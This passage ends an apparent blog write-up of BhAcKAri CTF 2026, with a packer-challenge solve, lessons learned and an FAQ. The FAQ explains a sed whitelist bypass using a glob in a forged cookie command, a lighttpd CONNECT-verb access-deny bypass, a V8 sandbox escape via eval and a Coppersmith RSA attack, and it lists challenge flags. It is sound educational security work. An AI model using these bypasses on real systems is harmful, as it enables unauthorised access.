**Layer 5 — decrypt.** Patch #4 (outer `0x1400010b8`) is a hand-rolled flag-builder that copies 28 bytes from `GetHandlerProperty2`'s code at fixed offsets (some plain reads, some XOR'd pairs). The inner PE then computes `CRC32(GetHandlerProperty2[0..0x250])` as a **4-byte RC4 key** and RC4-decrypts those 28 bytes.

```bash
$ ./solve.py -v
[+] DLL                   = handout/findme.dll
[+] GetHandlerProperty2   = rva=0x77b3c file=0x76f3c
[+] CRC32(fn[..0x250])    = 0x23cd958c
[+] RC4 ciphertext        = 4ea617b13a1b4db37a1ee082216a5202fab3e7e7dfd821e912f2d48f
bhackariCTF{7zip_1s_aw3s0m3}
```

**Flag:** `bhackariCTF{7zip_1s_aw3s0m3}`

**Reverse takeaway:** **this is the platonic ideal of a packer/unpacker challenge.** The author has built five layers of indirection where each layer's output is the next layer's key — and the keying material in layers 3-5 lives in a *third-party DLL* whose specific version matters. The lesson for offence: dynamically loaded DLLs in commodity software (7-Zip, OpenSSL, ICU) are stable binary artefacts that adversaries can pin against. The lesson for defence: if your anti-tamper relies on hashing a sibling DLL, a binary-replacement attack on that DLL silently breaks the chain.

---

## Lessons learned — what BhAcKAri CTF 2026 rewarded

Five patterns recur across all eight solves; they're the meat of intermediate jeopardy work:

1. **The artefact contains its own spec.** Streaming Service's deobfuscated JS *prints the AES key*. Last Bacaro Standing's brief *names the seed*. Mystery's init function *hashes its own file*. Don't Unpack Me's loader *points at the 7-Zip export by name*. When you can read every byte the player has, you can derive every key.
2. **Whitelist filters are bypassable by category, not by enumeration.** The Streaming Service's sed whitelist accepts `?` but not `.` — and `?` is a shell glob. Proxyproxy's `url.access-deny` rejects paths ending in `debug` — but `CONNECT /` doesn't end in anything because it's a tunneling verb, not an HTTP request. Bypass classes recur.
3. **Modular arithmetic gotchas live in every cipher.** Cake's Minecraft cipher uses floor-mod (Python `%`) where Java would use truncated `%`. Eepy's RSA leak crosses the Coppersmith bound precisely because `2^424 < N^(1/4) = 2^512`. The math being correct *and* the language semantics being right are both required.
4. **Stripped binaries that hash themselves are reproducible offline.** Mystery.so's `dladdr → fopen → SHA-256(self)` pattern is one line of recognition away from a complete pure-Python solve. Don't Unpack Me's `findme.dll` is a known-version DLL whose contents are public. The defensive limit of "self-anchoring" anti-tamper is "the anchor is part of the public attack surface."
5. **The Italian flavour text is part of the spec.** *"Il seme … l'è proprio el nome del posto"* literally tells you the seed. *"Ip da cambiare"* is the comment naming the C2 hostname. *"Smithing"* in Eepy's flavour names the attack class. CTF authors who write rich flavour text are signposting; read it like a manual.

## Source repository

Every per-challenge writeup includes solver scripts, AES key recovery, lattice setups, PE loader disassembly, and the Minecraft floor-mod proof:

**Repo:** [github.com/Abdelkad3r/bhackari-ctf-2026](https://github.com/Abdelkad3r/bhackari-ctf-2026)

If you're building a mixed-jeopardy learning progression from this writeup, the eight challenges form a clean order: **Horses (V8 patch + eval) → Streaming Service (JS deobfuscation + AES) → Proxyproxy (lighttpd config + CONNECT) → Last Bacaro Standing (LSB + seed identification) → Cake (datapack source + floor-mod) → Eepy (Coppersmith + Howgrave-Graham) → Mystery (Python C-ext + SHA derivation) → Don't Unpack Me (manual PE loader + 7-Zip CRC + RC4)**. That order maps to *"read the JS"* → *"deobfuscate the JS"* → *"read the server config"* → *"read the brief"* → *"read the .mcfunction"* → *"read the prime"* → *"read the .so's own bytes"* → *"read every DLL byte the binary depends on."*

{{< faq >}}
[
  {
    "q": "What is BhAcKAri CTF 2026?",
    "a": "BhAcKAri CTF 2026 is an Italian-themed jeopardy-style capture-the-flag competition hosted at challs.ctf.bhackari.it. The name plays on bacari, the small wine-and-cicchetti taverns of Venice. The 2026 edition runs eight challenges across four categories — Web, Misc, Crypto, and Reverse Engineering — with the flag prefix bhackariCTF{...}."
  },
  {
    "q": "How many challenges does BhAcKAri CTF 2026 have?",
    "a": "Eight challenges total: two Web (BhAcKAri Streaming Service, Proxyproxy), three Misc (Horses, Last Bacaro Standing, Cake), one Crypto (Eepy), and two Reverse (Mystery, Don't Unpack Me). All eight are solved in this writeup."
  },
  {
    "q": "Where can I find the BhAcKAri CTF 2026 solver scripts?",
    "a": "All eight per-challenge writeups, solver scripts, AES key recovery, lattice setups, and PE loader traces live in the source repository at github.com/Abdelkad3r/bhackari-ctf-2026. Each challenge has its own directory with a README and standalone solver."
  },
  {
    "q": "How is the BhAcKAri Streaming Service challenge solved?",
    "a": "The streaming page injects an obfuscated JS popunder. The obfuscation is a rot-14 cipher applied to every string in a property bag via Object.defineProperty getters. Decoding reveals an AES-256-CBC key (inshallah_nobody_will_steal_this), a 16-byte zero IV, and a sister C2 on port 5687 that runs a sed command from a decrypted cookie payload. The C2 enforces a whitelist of letters, space, dash, and ?. Forge a cookie containing {\"cmd\":\"sed -n p flag?txt\"} — the ? is a shell glob that expands to . — and the C2 reads flag.txt. Flag: bhackariCTF{c0m3_0n_n0w_wh0_do35nt_h4t3_r3d1r3ct5?}."
  },
  {
    "q": "What is the lighttpd HTTP CONNECT bypass in Proxyproxy?",
    "a": "The lighttpd config sets url.access-deny = ( \"debug\" ) and proxy.header sets connect => enable. lighttpd's access-deny does a case-sensitive suffix match against the fully decoded, normalised path, so /debug, /Debug, /xdebug, and /debug%2f are all blocked. But the connect => enable directive makes mod_proxy accept the HTTP CONNECT verb on any URL covered by a proxy.server rule. Since proxy.server = (\"/\" => backend:8000), sending CONNECT / HTTP/1.1 matches the rule and doesn't end in debug. lighttpd 200s the handshake and hands the TCP socket to Flask. POST /debug inside the tunnel returns the flag. Flag: bhackariCTF{ed7b8baf6bd6341f194a95394c1acd314cee7871de0eb67c}."
  },
  {
    "q": "How does the patched-d8 sandbox escape work in Horses?",
    "a": "The patched d8 (V8 shell) removes read, load, writeFile, Worker, os, d8, Realm, and several other globals — but leaves eval, print, and readline. The application code ships two bugs of its own. Bug 1: menu option 5 (Load Game) accepts arbitrary credits via JSON paste with no validation, so {\"c\":999999999,\"s\":[]} sets credits to a billion. Bug 2: shop item 3 (🐴 Terminal 🐴) costs 133,700 credits and drops the user into a print(eval(readline())) loop. After inflating credits and buying the terminal, type FLAG_1 — the top-level const resolves and print dumps it. Flag: bhackariCTF{C0rr1C4vall0o0!1!1!1}."
  },
  {
    "q": "What is the seed for Last Bacaro Standing's LSB steganography?",
    "a": "The seed is the lowercase string aciugheta — the name of La Cantina Aciugheta, a real historic bacaro near Campo SS. Filippo e Giacomo in Venice. The bar's name is on the burgundy awning in the carrier photo bacaro.png. The Venetian-dialect brief explicitly says 'el seme che serve a sta magia, l'è proprio el nome del posto' (the seed needed for this magic is the name of the place itself). Python's random.seed hashes the bytes of string inputs so case matters; lowercase aciugheta is the form that produces the printable plaintext. Flag: bhackariCTF{m4k3_b4cAr1_gr3at_4ga1n}."
  },
  {
    "q": "How is the Cake Minecraft datapack challenge solved?",
    "a": "The .mcfunction files implement a 63-symbol additive Vigenère keyed by the four ints of the player's UUID. The alphabet is a..z A..Z 0..9 _ (indices 0..62), and each position computes enc[i] = (idx + UUID[i%4]) mod 63. The critical gotcha is that Minecraft scoreboard %= uses floor-mod (Python semantics), not Java's truncated %. Read the player UUID from playerdata/72c97782-...-d1ed.dat with nbtlib, extract the expected ciphertext [29, 7, 29, 47, ..., 33] from prechk.mcfunction, and invert each position. Flag: bhackariCTF{_c4n_i_h4v3_4_sl1c3_}."
  },
  {
    "q": "What is Coppersmith's small-roots attack used for in Eepy?",
    "a": "The Eepy service leaks the top 600 bits of a 1024-bit prime p, with the bottom 424 bits zeroed. Write p = p_high * 2^424 + x with 0 ≤ x < 2^424. Since p divides N = pq, the monic linear polynomial f(x) = p_high * 2^424 + x has f(x_0) ≡ 0 mod p. Coppersmith's small-roots theorem recovers x_0 in polynomial time if |x_0| < N^(β²/d) where β = ½ for a prime factor and d = 1 for a linear polynomial — giving the bound 2^512. The unknown is 2^424, well below the bound. Build a Howgrave-Graham lattice of polynomials that vanish mod p^m at x_0 (m=t=6, dim 13), LLL-reduce, extract the integer root. Submit p, get the flag bhackariCTF{w0w_y0u_c4n_r34lly_sm1th}."
  },
  {
    "q": "What is the Howgrave-Graham lattice used in Eepy?",
    "a": "A 13-dimensional integer lattice built from two families of polynomials. The g_i family is g_i(x) = N^(m-i) * f(x)^i for i = 0..m, which vanishes mod p^m because f(x_0) = p, so f(x_0)^i ≡ 0 mod p^i and the N^(m-i) factor contributes another p^(m-i) since p | N. The h_j shift family is h_j(x) = x^j * f(x)^m for j = 1..t, which vanishes mod p^m trivially. Each polynomial is rewritten as P_k(xX) where X = 2^424 is the bound on x_0 — the substitution scales each coefficient by X^j. LLL-reduction on the resulting integer matrix produces a polynomial whose shortest reduced vector has x_0 as a root over the integers, not just modulo p^m. Newton's method extracts the integer root in microseconds."
  },
  {
    "q": "How is the Mystery Python C-extension solved?",
    "a": "mystery.so calls dladdr + fopen + EVP_DigestUpdate to compute SHA-256 of its own file during init, and also CRC32 of its own bytes. Those two values plus a 64-byte table0 (derived from SHA via a SplitMix-style mixer) define the four stage check functions deterministically. Each stage check returns a value computable from sha, noise (CRC32), and table0 — without ever running the module. The reveal() function chain-mixes the four stage values plus sha plus noise into a 32-byte AES-256-CTR key with a 16-byte zero IV, which decrypts flag.enc. Pure Python solve, no execution. Flag: bhackariCTF{F1n4lly_th4_My$t3rY_!S_$OlvEd!!!}."
  },
  {
    "q": "How does Don't Unpack Me work?",
    "a": "Five-layer treasure hunt. Outer is a 5,632-byte PE with a manual loader that VirtualAllocs a RWX page, copies an inner PE from section .x, resolves the inner's imports, and patches four 8-byte slots in the inner entry function with callbacks back into the outer's own .text. Patch 2 XORs 19 bytes of outer .rdata against 19 bytes of inner .rdata to reveal the string GetHandlerProperty2 — a 7-Zip export. Patch 3 calls GetFileVersionInfoA on findme.dll and checks for 7-Zip v24.09. Patch 4 reads 28 bytes from GetHandlerProperty2's compiled machine code at fixed offsets, computes CRC32 over the function's first 0x250 bytes as a 4-byte RC4 key, and RC4-decrypts. Flag: bhackariCTF{7zip_1s_aw3s0m3}."
  },
  {
    "q": "Why is BhAcKAri CTF Italian-themed?",
    "a": "The CTF infrastructure is on the .it TLD (challs.ctf.bhackari.it) and the name itself is a wordplay on bacari, the small wine-and-cicchetti taverns of Venice. Multiple challenges lean into the Venetian theme: Last Bacaro Standing is a love letter to the dying bacari written in Venetian dialect, with the seed of its LSB steganography being the name of a real historic bacaro (La Cantina Aciugheta). Horses' flag decodes to Corri Cavallo (Italian for 'Run, horse'). Streaming Service includes Italian comments like 'ip da cambiare' (IP to be changed). The Italian flavour is part of the spec — reading the brief carefully is reading the challenge."
  },
  {
    "q": "Is BhAcKAri CTF 2026 beginner-friendly?",
    "a": "Mixed-intermediate. Horses, Last Bacaro Standing, and Proxyproxy are approachable with basic scripting and patient reading. Streaming Service requires comfort with JavaScript deobfuscation and AES-256-CBC. Cake needs familiarity with Minecraft data internals (NBT, .mcfunction scoreboard arithmetic). Eepy requires Coppersmith / Howgrave-Graham lattice knowledge — Sage or fpylll is essentially mandatory. Mystery and Don't Unpack Me are the hardest, demanding Python C-extension reverse engineering and Windows PE / manual loader analysis respectively. Start with Horses or Proxyproxy."
  },
  {
    "q": "What tools should I use for BhAcKAri CTF 2026?",
    "a": "JavaScript deobfuscation: a JS debugger or node REPL for the Streaming Service rot-14 unwrap. HTTP exploitation: curl + netcat for Proxyproxy's CONNECT handshake. Steganography: PIL/Pillow for Last Bacaro Standing's LSB read. Minecraft: nbtlib for Cake's UUID extraction. Cryptography: fpylll or Sage for Eepy's LLL reduction (m=t=6, dim 13). Reverse engineering: radare2 / IDA / Ghidra for Mystery's stripped .so and Don't Unpack Me's PE plus the 7z.dll v24.09 disassembly. All eight challenges are solvable on a standard Linux laptop without commercial tooling."
  }
]
{{< /faq >}}
